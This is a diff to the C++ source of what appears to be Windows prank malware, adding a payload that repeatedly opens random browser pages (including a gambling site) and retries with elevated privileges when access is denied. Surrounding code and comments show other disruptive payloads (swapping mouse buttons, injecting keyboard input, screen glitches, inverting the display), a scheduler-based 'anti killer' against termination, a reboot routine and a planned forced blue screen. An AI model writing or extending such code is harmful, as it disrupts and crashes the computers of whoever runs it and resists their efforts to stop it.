@@ -1,5 +1,6 @@
 #include <windows.h>
 #include <wininet.h>
+#include <shellapi.h>
 #include <iostream>
 #include <atomic>
 #include <thread>
@@ -10,6 +11,7 @@
 #include "payloads.h"
 
 #pragma comment(lib, "wininet") // fixes weird thing with wininet unresolved symbols
+#pragma comment(lib, "shell32")
 
 #define TIME_SECOND 1000
 #define MAX_RUNTIME 15
@@ -19,7 +21,7 @@ std::mt19937 mt(rd());
 std::atomic<int> runtime = 0;
 
 //#define FORCELOOP
-//#define TEST
+#define TEST
 
 void reboot(void) 
 {
@@ -168,16 +170,52 @@ void PayloadInvert(void) {
 	}
 }
 
+bool open_browser(const char* url, HWND parent = NULL)
+{
+	// Try normally, with the default verb (which will typically be "open")
+	HINSTANCE result = ShellExecuteA(parent, NULL, url, NULL, NULL, SW_SHOWNORMAL);
+
+	// If that fails due to privileges, let's ask for more and try again
+	if ((int)result == SE_ERR_ACCESSDENIED) {
+		std::cout << "NO PERMISSION" << std::endl;
+		result = ShellExecuteA(parent, "runas", url, NULL, NULL, SW_SHOWNORMAL);
+	}
+
+	// Return whether or not we were successful.
+	return ((int)result > 32);
+}
+
+void PayloadBrowser(void)
+{
+	LPCSTR searches[] = {
+		"https://www.google.com/search?q=epic+gamer+montag",
+		"https://www.google.com/search?q=doritos",
+		"https://www.google.com/search?q=mountain%20dew",
+		"https://www.google.com/search?q=lol%20epic%20combos",
+		"https://www.google.com/search?q=how%202%20b%20epic%20gamr",
+		"https://sites.google.com/a/ausdg.us/force-and-motion/the-entire-bee-movie-script",
+		"https://www.google.com/search?q=bedtime+stories",
+		"https://www.google.com/search?q=epic%20fortnite%20dance",
+		"http://csgojackpot.cash/"
+	};
+
+	for (;;) {
+		open_browser(searches[mt() % sizeof(searches) / sizeof(*searches)]);
+		std::this_thread::sleep_for(std::chrono::seconds(90 - (runtime * 2)));
+	}
+}
+
 // todo:
 //  DONE multithread 
 //  anti killer - FIXED with scheduler
 //  DONE bsod at end
 void LaunchPayloads(void)
 {
-	std::array<std::function<void(void)>, 6	> payloads = {
+	std::array<std::function<void(void)>, 7> payloads = {
 			PayloadKeyboardInput,
 			PayloadSwapMouseButtons,
 			PayloadCursor,
+			PayloadBrowser,
 			PayloadScreenGlitch,
 			PayloadMessageBox,
 			PayloadInvert
@@ -221,6 +259,8 @@ void yesnobox(void) {
 
 int main(void)
 {
+
+
 	for (;;) {
 
 		time_t t = time(NULL);
